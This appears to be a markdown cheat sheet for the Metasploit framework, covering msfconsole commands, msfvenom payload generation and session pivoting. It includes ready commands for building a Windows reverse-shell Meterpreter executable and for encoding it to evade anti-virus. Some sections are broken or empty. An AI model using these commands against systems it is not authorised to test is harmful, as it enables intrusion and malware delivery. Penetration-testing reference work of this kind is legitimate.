## Description:

Metasploit is a popular open-source framework used by security professionals to perform penetration testing and exploit development. It provides a suite of tools and resources for testing the security of computer systems, networks, and applications. Metasploit allows users to identify vulnerabilities, develop and test exploits, and automate the process of identifying and exploiting security weaknesses. The framework includes a large database of exploits, payloads, and auxiliary modules that can be used to test different aspects of a target system's security. Metasploit can be used for both offensive and defensive security purposes, making it a versatile tool for cybersecurity professionals.

## Installation

```Shell
sudo apt install metasploit-framework
```

```bash
sudo pacman -Syu metasploit
```

## Commands

###### Search for module:

```
msf > search [regex]
```

###### Specify and exploit to use:

```
msf > use exploit/[ExploitPath]
```

###### Specify a Payload to use:

```
msf > set PAYLOAD [PayloadPath]
```

###### Show options for the current modules:

```
msf > show options
```

###### Set options:

```
msf > set [Option] [Value]
```

```

##### Useful Auxiliary Modules


###### Port Scanner:

```

## msfvenom :

The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode 
them. This tool replaces the former msfpayload and msfencode tools. Run with â€˜'-l payloadsâ€™ to get a list of payloads.

```
$ msfvenom â€“p [PayloadPath]
â€“f [FormatType]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
```

Example :

Reverse Meterpreter payload as an executable and redirected into a file:

```
$ msfvenom -p windows/meterpreter/
reverse_tcp -f exe LHOST=10.1.1.1
LPORT=4444 > met.exe
```

Format Options (specified with â€“f) --help-formats â€“ List available output formats

| Extension | Description   |
| --------- | ------------- |
| exe       | Executable    |
| pl        | Perl          |
| rb        | Ruby          |
| raw       | Raw Shellcode |
| C         | C Code              |

Encoding Payloads with msfvenom

The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with '-l encoders'

to get a list of encoders.
```
$ msfvenom -p [Payload] -e [Encoder] -f
[FormatType] -i [EncodeInterations]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
```

Example

Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:

```
$ msfvenom -p windows/meterpreter/
reverse_tcp -i 5 -e x86/shikata_ga_nai -f
exe LHOST=10.1.1.1 LPORT=4444 > mal.exe
```

## Managing Sessions

###### Multiple Exploitation: 

Run the exploit expecting a single session that is immediately backgrounded:

```
msf > exploit -z
```

Run the exploit in the background expecting one or more sessions that are immediately backgrounded:

```
msf > exploit â€“j
```

###### List all current jobs (usually exploit listeners):

```
msf > jobs â€“l
```

###### Kill a job:

```
msf > jobs â€“k [JobID]
```

##### Multiple Sessions:

###### List all backgrounded sessions:

```
msf > sessions -l
```

###### Interact with a backgrounded session:

```
msf > session -i [SessionID]
```

###### Background the current interactive session:

```
meterpreter > <Ctrl+Z>
or
meterpreter > background
```

###### Routing Through Sessions:

All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.

```
msf > route add [Subnet to Route To]
[Subnet Netmask] [SessionID]
```
